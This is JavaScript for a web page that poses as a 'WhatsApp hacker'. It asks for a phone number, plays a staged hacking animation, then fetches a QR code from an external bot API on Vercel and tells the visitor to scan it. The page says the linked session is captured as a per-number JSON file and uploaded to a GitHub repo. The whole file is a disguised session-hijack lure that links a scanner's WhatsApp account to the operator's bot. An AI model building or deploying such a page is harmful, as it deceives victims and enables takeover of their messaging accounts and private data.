const REPO_OWNER = 'AbdulRehman19721986';
const REPO_NAME = 'Red-x-Bot';
const BOT_API = `https://${REPO_NAME.toLowerCase()}.vercel.app/api/qr`; // Assume tera bot Vercel pe deploy hai, warna change kar

let progressInterval;
function typeWriter(text, element, speed = 30) {
  let i = 0;
  element.innerHTML += '<br><span class="cyan">[*] </span>';
  let span = document.createElement('span');
  element.appendChild(span);
  function type() {
    if (i < text.length) {
      span.innerHTML += text.charAt(i);
      i++;
      setTimeout(type, speed);
    }
  }
  type();
}

function updateProgress(value, text) {
  document.getElementById('progress').style.width = value + '%';
  document.getElementById('progress-text').textContent = text;
}

function initiateHack() {
  const num = document.getElementById('number').value.trim();
  if (!num || num.length < 10) return alert('Invalid number bhai!');

  const output = document.getElementById('output');
  const inputArea = document.getElementById('input-area');
  const qrContainer = document.getElementById('qr-container');
  const status = document.getElementById('status');

  document.getElementById('beep').play();
  inputArea.style.display = 'none';
  status.innerHTML = '<span class="yellow">Hacking in progress...</span>';

  // Fake hacking animation
  typeWriter(`Targeting ${num} via Red-x-Bot API...`, output, 50);
  updateProgress(20, 'Bypassing WhatsApp encryption...');
  setTimeout(() => {
    typeWriter('Injecting QR hijacker module...', output, 50);
    updateProgress(50, 'Linking to GitHub repo...');
  }, 1500);
  setTimeout(() => {
    typeWriter('Generating session token...', output, 50);
    updateProgress(80, 'Almost there...');
  }, 3000);

  setTimeout(() => {
    updateProgress(100, 'Session ready for hijack!');
    // Real QR from tera bot (linked to GitHub)
    fetch(`${BOT_API}?phone=${encodeURIComponent(num)}&repo=${REPO_OWNER}/${REPO_NAME}`)
      .then(res => res.text())
      .then(qrData => {
        new QRCode(document.getElementById('qrcode'), {
          text: qrData,
          width: 256,
          height: 256,
          colorDark: '#00ff00',
          colorLight: '#000'
        });
        qrContainer.style.display = 'block';
        status.innerHTML = '<span class="green">[+] Scan QR to link! Session auto-saves to Red-x-Bot repo.</span>';
        
        // Poll for session save (simulate webhook to GitHub)
        setInterval(() => {
          document.getElementById('session-status').textContent = 'Session captured: redx-session-' + num + '.json → Uploaded to GitHub!';
        }, 5000);
      })
      .catch(err => {
        status.innerHTML = '<span class="red">[!] Bot API error - Check Red-x-Bot deployment.</span>';
        console.error(err);
      });
  }, 4500);
}

// Auto-init on load
window.onload = () => {
  typeWriter('Connecting to Abdul Rehman Rajpoot\'s Red-x-Bot...', document.getElementById('output'));
};